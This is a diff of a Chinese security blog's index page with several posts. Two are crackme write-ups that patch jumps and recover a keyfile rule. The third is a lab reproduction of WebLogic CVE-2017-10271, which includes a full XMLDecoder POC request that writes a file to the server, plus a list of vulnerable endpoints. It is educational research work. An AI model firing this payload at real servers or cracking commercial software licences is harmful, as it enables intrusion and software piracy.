+<h3 id="LoadIconA"><a href="#LoadIconA" class="headerlink" title="LoadIconA()"></a>LoadIconA()</h3><p>（加载图标函数），LoadCursorA()（加载光标）</p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668935442602.png" alt="1668935442602"></p>
+<h2 id="逆向开始"><a href="#逆向开始" class="headerlink" title="逆向开始"></a>逆向开始</h2><p>1.前面正常步过，到达第一个跳转，此处CreateFileA函数表示想要打开许可证文件，显然文件不存在就直接报错了。</p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668935817910.png" alt="1668935817910"></p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668936065650.png" alt="1668936065650"></p>
+<p>2.若不跳转，下方代码将显示凭证失效，跳转失败</p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668935888696.png" alt="1668935888696"></p>
+<p>3.修改标志位ZF&#x3D;0，进行跳转，到达第二个跳转处，能看到一个ReadFile函数，显然会读取文件内容，后续进行校验，而下方的JMP跳转[004010F7]也是显示许可证无效的，所以需要在JNZ处跳转。</p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668936195001.png" alt="1668936195001"></p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668936252826.png" alt="1668936252826"></p>
+<p>4.第三个跳转点，依旧是报错码地址，不能跳转，修改SF&#x3D;0</p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668936489401.png" alt="1668936489401"></p>
+<p>5.接着走，看到一堆跳转，发现只有00401205是通往正确的路径，跳转如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">je short 004010D3  跳转</span><br><span class="line">jl short 004010F7  不跳转</span><br><span class="line">jmp 00401205	   无条件跳转</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668936714514.png" alt="1668936714514"></p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668936781792.png" alt="1668936781792"></p>
+<p>6.成功破解</p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668936987070.png" alt="1668936987070"></p>
+<p>7.修改函数内容，保存破解文件</p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668937666210.png" alt="1668937666210"></p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668937688272.png" alt="1668937688272"></p>
+<h2 id="算法分析，解密许可证"><a href="#算法分析，解密许可证" class="headerlink" title="算法分析，解密许可证"></a>算法分析，解密许可证</h2><p>1.新建一个Keyfile.bat文件，写入五字节的字符串”12345”，并跟进到函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp dword ptr ds:[0x402173],0x10</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668938779690.png" alt="1668938779690"></p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668938863596.png" alt="1668938863596"></p>
+<p>2.显然该处内存存储的是许可证的字节大小，由jl跳转可知，只有许可证大于16字节才能继续验证</p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668938977114.png" alt="1668938977114"></p>
+<p>3.读取许可证内容，赋值给AL，ascii码的1为16进制的”0x31”,接着与0X47进行比较，发现为ascii码的大写字母”G”，若第一个字节相等，就跳转验证第二个字节，显然每次循环都是比较”G”</p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668939276874.png" alt="1668939276874"></p>
+<p>4.结论，先校验许可证是否有16字节，然后比较前8字节是否全等于”G”，当前八字节通过验证后，即全部通过验证。</p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668940563253.png" alt="1668940563253"></p>
+<p><img src="/2022/09/04/ReverseMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1668940585421.png" alt="1668940585421"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yuband">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yuband's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/" class="post-title-link" itemprop="url">TraceMe逆向分析破解</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-09-03 14:14:53" itemprop="dateCreated datePublished" datetime="2022-09-03T14:14:53+08:00">2022-09-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/OllyDebug/" itemprop="url" rel="index"><span itemprop="name">OllyDebug</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/OllyDebug/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">逆向破解</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="待破解程序"><a href="#待破解程序" class="headerlink" title="待破解程序"></a>待破解程序</h2><p>需要破解该程序序列号</p>
+<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1693760189718.png" alt="1693760189718"></p>
+<h2 id="前期思路"><a href="#前期思路" class="headerlink" title="前期思路"></a>前期思路</h2><p>首先使用触发型断点方式，遇到程序运行就进行断点，但最终会进入到死循环</p>
+<p>后来发现是一个消息队列，只有识别到输入之后才会读取到输入的参数</p>
+<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668701128742.png" alt="1668701128742"></p>
+<p>我们知道windows读取文本框的字符串的常用函数如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GetDlgItemTextA(GetDlgTtemTextW)</span><br><span class="line">GetWindowTextA(GetWindowTextA)</span><br></pre></td></tr></table></figure>
+
+<h2 id="转换思路"><a href="#转换思路" class="headerlink" title="转换思路"></a>转换思路</h2><p>使用ctrl+G搜索上述函数，并查找到对应函数，其使用了GetDlgItemTextA函数</p>
+<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668701686552.png" alt="1668701686552"></p>
+<p>直接在这里打上断点，然后运行到该位置，弹窗需要输入账户，序列号</p>
+<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668701845419.png" alt="1668701845419"></p>
+<p>一直单步F8往下走，只到下方出现了熟悉的字符串”yubank”</p>
+<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668702387021.png" alt="1668702387021"></p>
+<p>显然，EAX和EDX分别存储序列号和用户名，下面那个”call 00401340”显然为调用的验证函数</p>
+<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668702468103.png" alt="1668702468103"></p>
+<p>又已知”EAX”为所调用函数的返回值，我们接着往下走，跳过函数，执行完test操作后，Z为1，说明函数返回值EAX为0</p>
+<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668702812828.png" alt="1668702812828"></p>
+<p>前置知识：JE的作用，当eax为0是，ZF为1，跳转</p>
+<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668702712877.png" alt="1668702712877"></p>
+<p>显然往下走，就提示错误了，说明函数验证未通过，返回了0</p>
+<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668702922363.png" alt="1668702922363"></p>
+<h2 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h2><p>1、修改EAX的指为正数，或者修改test的参数为正数</p>
+<p>2、修改跳转函数，将其反过来，密码错误就表示成功</p>
+<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668703147710.png" alt="1668703147710"></p>
+<p>3、直接注释跳转函数</p>
+<h2 id="实现破解"><a href="#实现破解" class="headerlink" title="实现破解"></a>实现破解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将test eax,eax 修改为 test esp,esp  (其中esp = 0xc ,为正数)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668703910927.png" alt="1668703910927"></p>
+<p>破解成功</p>
+<p><img src="/2022/09/03/TraceMe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%A0%B4%E8%A7%A3/1668703993354.png" alt="1668703993354"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yuband">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yuband's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/" class="post-title-link" itemprop="url">weblogic漏洞分析-CVE-2017-10271（IDEA+Docker）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-08-14 17:29:18" itemprop="dateCreated datePublished" datetime="2022-08-14T17:29:18+08:00">2022-08-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java-web/" itemprop="url" rel="index"><span itemprop="name">Java web</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java-web/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">反序列化</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>复现可以使用vulhub项目 <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">(vulhub)</a></p>
+<p>进入目录<code>vulhub/weblogic/CVE-2017-10271</code>，然后修改<code>docker-compose.yml</code>文件，并添加调试端口<code>- &quot;8453:8453&quot;</code>，如下所示</p>
+<p><img src="/Picture/1690989062177.png" alt="1690989062177"></p>
+<p>之后使用<code>docker-compose up -d</code>命令下载并拉起docker服务，使用<code>docker ps</code>命令查看docker服务的运行情况以及docker id，并使用命令<code>docker exec -it d4eb3d7f9dfd /bin/bash</code>进入到容器内部</p>
+<p><img src="/Picture/1690989494567.png" alt="1690989494567"></p>
+<p>使用<code>vi</code>命令修改<code>/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</code> 文件，并手动添加两个调试参数</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debugFlag=<span class="string">&quot;true&quot;</span></span><br><span class="line"><span class="built_in">export</span> debugFlag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Picture/1690989740007.png" alt="1690989740007"></p>
+<p>修改完成之后手动运行一下这个脚本，如下所示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@d4eb3d7f9dfd:~/Oracle/Middleware# /root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</span><br></pre></td></tr></table></figure>
+
+<p>然后退出容器，并重启这个容器</p>
+<p>由于需要在本地远程调试weblogic，而本地没有源码，因此需要去容器把源码拉下来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//获取docker-id : <span class="string">&quot;d4eb3d7f9dfd&quot;</span></span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line">//将容器内wlserver_10.3目录下的的源码复制一份到本地</span><br><span class="line">docker <span class="built_in">cp</span> d4eb3d7f9dfd:/root/Oracle/Middleware/wlserver_10.3 ./WebLogic_jars</span><br><span class="line"></span><br><span class="line">//打包为zip包，方便下载放在windows本地</span><br><span class="line">zip -r WebLogic_jars.zip WebLogic_jars/</span><br><span class="line"></span><br><span class="line">//导出依赖包，有两种方式，分别介绍</span><br><span class="line"></span><br><span class="line">//(1)大部分jar包位于modules目录，直接将整个目录烤出来，基本能满足调试需求</span><br><span class="line">docker <span class="built_in">cp</span> d4eb3d7f9dfd:/root/Oracle/Middleware/modules ./modules</span><br><span class="line">zip -r modules.zip modules/</span><br><span class="line"></span><br><span class="line">//(2)使用批量检索方式导出Middleware目录内所有jar包，若方法1依旧不全，则可以导出全部jar包进行调试</span><br><span class="line"><span class="built_in">cd</span> /root/Oracle/Middleware</span><br><span class="line"><span class="built_in">mkdir</span> <span class="built_in">test</span></span><br><span class="line">find ./ -name *.jar -<span class="built_in">exec</span> <span class="built_in">cp</span> &#123;&#125; ./test/ \;</span><br><span class="line">docker <span class="built_in">cp</span> d4eb3d7f9dfd:/root/Oracle/Middleware/test ./test</span><br><span class="line">zip -r test.zip <span class="built_in">test</span>/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Picture/1690990024755.png" alt="1690990024755"></p>
+<p><img src="/Picture/1690990334353.png" alt="1690990334353"></p>
+<h2 id="idea配合Docker远程Debug"><a href="#idea配合Docker远程Debug" class="headerlink" title="idea配合Docker远程Debug"></a>idea配合Docker远程Debug</h2><p>将之拖到Windows本地文件夹中，由于<code>WebLogic_jars.zip</code>里面文件目录较深，若解压时所处目录较长，将无法正常解压所有文件，因此建议在根目录新建一个文件夹用于存放<code>wlserver_10.3</code>和<code>modules</code>，如下所示</p>
+<p><img src="/Picture/1691050453105.png" alt="1691050453105"></p>
+<p>然后鼠标右击选择<code>wlserver_10.3</code>，并使用<code>idea</code>打开，右上角选择<code>Edit Configurations</code>  ，然后添加<code>Remote JVM Debug</code>，配置如下后选择<code>Apply</code>和<code>OK</code>，即可完成配置。</p>
+<p><img src="/Picture/1691050640956.png" alt="1691050640956"></p>
+<p>然后将<code>wlserver_10.3/server/lib</code>和<code>modules</code>这两个文件夹添加到<code>library</code>，左上角选择<code>File</code>—&gt;<code>Project Structure</code>，具体操作如下所示</p>
+<p><img src="/Picture/1691050848845.png" alt="1691050848845"></p>
+<p><img src="/Picture/1691050860094.png" alt="1691050860094"></p>
+<p>右上角选择<code>Debug</code>按钮，若出现提示<code>Connected to the target VM, address: &#39;192.168.253.8:8453&#39;, transport: &#39;socket&#39;</code>，则说明<code>远程Debug</code>配置连接成功</p>
+<p><img src="/Picture/1691050941932.png" alt="1691050941932"></p>
+<p>简单测试能否断点成功，找到文件<code>wlserver_10.3/server/lib/weblogic.jar!/weblogic/wsee/jaxws/WLSServletAdapter.class</code>，这里可以直接使用组合键<code>Ctrl+Shift+N</code>搜索<code>WLSServletAdapter.class</code>，并在<code>handle()</code>方法处打上断点</p>
+<p><img src="/Picture/1691051218615.png" alt="1691051218615"></p>
+<p><img src="/Picture/1691051295565.png" alt="1691051295565"></p>
+<p>然后右上角选择断点，浏览器访问链接<code>http://192.168.253.8:7001/wls-wsat/CoordinatorPortType</code>，成功断点，如下所示</p>
+<p><img src="/Picture/1691051518430.png" alt="1691051518430"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问URL：<a target="_blank" rel="noopener" href="http://192.168.253.8:7001/wls-wsat/CoordinatorPortType">http://192.168.253.8:7001/wls-wsat/CoordinatorPortType</a></p>
+<p>若出现如下页面，则说明存在该漏洞</p>
+<p><img src="/Pictures/1693536452028.png" alt="1693536452028"></p>
+<p>除了上述漏洞入口，下面是其他可以利用的URL</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>
+
+<p>POC</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://192.168.253.8:7001/wls-wsat/CoordinatorPortType</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.253.8:7001</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,eu;q=0.7,ja;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>b-user-id=84f0264e-a02a-70a0-a51d-74b587c8a089; ADMINCONSOLESESSION=dPBFkxCfQZtvZQpT83SLvyyTv5wTvXF49JQJBjy2M1f5bTpSvZYB!898710205</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>705</span><br><span class="line"></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.6.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;println&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>just_test<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;close&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>使用Debug工具查看当前元素名称，获取到了<code>java</code>标签</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2.getLocalName()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Pictures/1693553536985.png" alt="1693553536985"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10172">weblogic漏洞分析之CVE-2017-10271 - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.wxylyw.com/2018/11/03/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">WebLogic XMLDecoder反序列化漏洞 | 像风 (wxylyw.com)</a></p>
+<a href="/2022/08/13/%E7%90%86%E8%A7%A3Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/" title="理解Java反序列化漏洞原理">理解Java反序列化漏洞原理</a>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
 
 
 
@@ -699,13 +1200,13 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
   </nav>
